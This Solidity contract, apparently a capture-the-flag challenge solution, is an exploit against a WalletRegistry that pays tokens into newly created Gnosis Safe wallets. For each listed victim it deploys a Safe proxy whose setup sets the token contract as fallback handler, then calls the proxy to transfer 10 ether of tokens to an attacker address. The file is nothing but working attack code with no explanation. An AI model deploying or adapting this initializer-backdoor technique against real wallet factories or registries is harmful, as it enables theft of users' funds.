// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./WalletRegistry.sol";

contract WalletRegistryAttack2 {
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry registry;
    IERC20 token;

    constructor(
        address payable gnosisSafeAddress,
        address gnosisSafeProxyFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress
    ) {
        masterCopy = GnosisSafe(gnosisSafeAddress);
        walletFactory = GnosisSafeProxyFactory(gnosisSafeProxyFactoryAddress);
        registry = WalletRegistry(walletRegistryAddress);
        token = IERC20(tokenAddress);
    }

    function execute(address[] memory victims, address attacker) external {
        // create a wallet for each beneficiary
        for (uint256 i = 0; i < victims.length; i++) {
            address beneficiary = victims[i];
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners, // _owners
                1, // _threshold
                address(0), // to
                "", // data
                address(token), // fallbackHandler
                address(0), // paymentToken
                0, // payment
                address(0) // paymentReceiver
            );

            // generate the wallet and call the registry callback
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                1,
                registry
            );

            (bool approveSuccess, ) = address(proxy).call(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    attacker,
                    10 ether
                )
            );
        }
    }
}
